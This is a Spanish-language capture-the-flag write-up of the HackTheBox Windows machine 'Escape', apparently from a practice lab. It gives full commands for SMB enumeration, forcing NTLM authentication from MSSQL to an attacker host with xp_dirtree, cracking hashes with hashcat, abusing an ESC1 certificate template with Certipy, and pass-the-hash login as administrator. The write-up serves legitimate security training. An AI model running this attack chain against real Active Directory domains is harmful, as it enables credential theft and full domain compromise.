# Escape - HackTheBox

**Fecha de resolución:** 24-25 de septiembre de 2026

Máquina Windows Active Directory, IP 10.129.228.253, dominio `sequel.htb`, controlador de dominio `DC`.

## Reconocimiento

Escaneo completo de puertos:

```
nmap --privileged -sS -n -p- --min-rate 5000 -vvv -oG allPorts 10.129.228.253
```

Puertos abiertos típicos de un DC: 53 (DNS), 88 (Kerberos), 135/139/445 (RPC/SMB), 389/636/3268/3269 (LDAP/LDAPS/GC), 464 (kpasswd), 1433 (MSSQL), 5985 (WinRM), 9389 (ADWS), más varios puertos RPC altos. Escaneo de versiones sobre esos puertos:

```
nmap 10.129.228.253 -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49708,49718 -sS -sVC -vvv -n -oN targets
```

El certificado LDAPS confirma el dominio `sequel.htb` y la CA `sequel-DC-CA`, lo que ya apunta a que hay AD CS desplegado.

El puerto 5985 (WinRM) responde por HTTP, así que probé fuzzing de rutas ahí con gobuster:

```
gobuster dir -u http://10.129.228.253:5985 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Todas las rutas devuelven 404: es el endpoint SOAP de WinRM, no hay nada que enumerar por ese lado. Descarto esta vía y sigo por SMB.

## SMB anónimo: credenciales filtradas

Enumeración de shares sin credenciales:

```
smbmap -H 10.129.228.253 -u 'guest'
```

El share `Public` es de lectura para cualquiera. Entro con `smbclient.py` de Impacket usando `guest` y contraseña vacía:

```
smbclient.py guest@10.129.228.253
use Public
ls
get "SQL Server Procedures.pdf"
```

El PDF es un manual interno con procedimientos de SQL Server que incluye, en texto plano, una cuenta de aplicación: `PublicUser` con contraseña `GuestUserCantWrite1`.

## Acceso a MSSQL como PublicUser

Con la credencial en mano intento sacar el listado de usuarios del dominio autenticado como `PublicUser`:

```
nxc smb sequel.htb -u 'PublicUser' -p 'GuestUserCantWrite1' --rid-brute
```

Devuelve `STATUS_ACCESS_DENIED`: la cuenta no tiene permisos para esa llamada LSA aunque sí autentica. Repito el rid-brute con la cuenta `guest` en su lugar y esta sí funciona, listando los usuarios del dominio (Tom.Henn, Brandon.Brown, Ryan.Cooper, sql_svc, James.Roberts, Nicole.Thompson):

```
nxc smb sequel.htb -u 'guest' --rid-brute
```

Con la lista de usuarios y la credencial del PDF, me conecto a la instancia MSSQL:

```
mssqlclient.py PublicUser:'GuestUserCantWrite1'@sequel.htb
```

Dentro, `xp_cmdshell` está deshabilitado y sin permisos para `PublicUser`. Antes de descartar la vía SQL del todo, cambio a `tempdb` y reviso sus tablas con `enum_tables`, que muestra una tabla temporal `#A4C4CDDB`. Pruebo varias formas de consultarla (`select * from dbo #A4C4CDDB`, `dbo.#A4C4CDDB`, con corchetes) y todas fallan con `Invalid object name`; abandono esa tabla, no lleva a nada.

La vía real es forzar autenticación NTLM saliente del servidor hacia mi máquina con `xp_dirtree`. Las dos primeras sintaxis no disparan nada (`xp_dirtree http://10.10.14.224/x...`, sin resultado); la que funciona es la ruta UNC clásica:

```sql
xp_dirtree \\10.10.14.224\comparte\\
```

## Captura y crackeo del hash de sql_svc

Con Responder escuchando en la interfaz de la VPN (`sudo responder -I tun0`), la petición del `xp_dirtree` llega autenticada por el servicio SQL Server (`sql_svc`), que captura un hash NetNTLMv2. Lo guardo en `ntlmv2hash.txt` y lo crackeo con hashcat contra rockyou:

```
hashcat -m 5600 ntlmv2hash.txt /usr/share/wordlists/rockyou.txt
```

Resultado: `sql_svc:REGGIE1234ronnie`.

## Acceso como sql_svc

Confirmo la credencial por SMB y entro por WinRM:

```
nxc smb sequel.htb -u 'SQL_SVC' -p 'REGGIE1234ronnie' --sam
evil-winrm -i sequel.htb -u SQL_SVC -p 'REGGIE1234ronnie'
```

Recorriendo el sistema llego a `C:\SQLServer\Logs`, donde hay un `ERRORLOG.BAK` de una instalación anterior de SQL Server. Lo descargo y lo reviso:

```
download ERRORLOG.BAK
```

El log contiene dos intentos de logon fallidos justo después del arranque del servicio:

```
Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match...
Logon failed for user 'NuclearMosquito3'. Reason: Password did not match...
```

El segundo intento tiene como nombre de usuario lo que en realidad es una contraseña: alguien escribió su contraseña en el campo de usuario por error. Pruebo esa cadena como contraseña real de `Ryan.Cooper`.

## Acceso como Ryan.Cooper

```
evil-winrm -i sequel.htb -u Ryan.Cooper -p 'NuclearMosquito3'
```

Login correcto. Flag de usuario capturada en su escritorio.

## Enumeración de AD CS con Certipy

Con credenciales de dominio válidas reviso la Autoridad Certificadora:

```
certipy-ad find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.228.253
certipy-ad find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -vulnerable -stdout
```

El resultado marca el template `UserAuthentication` como **ESC1**: permite autenticación de cliente, cualquier usuario del dominio puede inscribirse (`Domain Users`) y el solicitante puede especificar el subject/SAN del certificado (`Enrollee Supplies Subject`).

## Explotación de ESC1

Solicito un certificado para el template vulnerable indicando como UPN alternativo `administrator@sequel.htb`:

```
certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -ca 'sequel-DC-CA' -template UserAuthentication -upn 'administrator@sequel.htb'
```

Certipy entrega `administrator.pfx`. El primer intento de usar el certificado directamente contra WinRM (extrayendo cert y clave con `certipy-ad cert -pfx administrator.pfx -nokey/-nocert` y pasándolos a `evil-winrm -c administrator.crt -k administrator.crt -u administrator -S`) se queda colgado estableciendo la conexión y hay que cancelarlo. En vez de insistir por ahí, pido directamente el ticket Kerberos y el hash NT con Certipy:

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
```

Esto falla en un primer intento por desfase horario entre mi máquina y el DC (Kerberos exige que el reloj esté sincronizado). Instalo `ntpsec-ntpdate` y sincronizo contra el propio DC:

```
sudo apt install ntpsec-ntpdate
sudo ntpdate 10.129.228.253
```

Con el reloj corregido, `certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253` obtiene un TGT y el hash NT de `administrator`.

## Acceso como administrator

```
evil-winrm -i sequel.htb -u administrator -H <hash NT>
```

`whoami` confirma `sequel\administrator`. Flag de root capturada en su escritorio.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
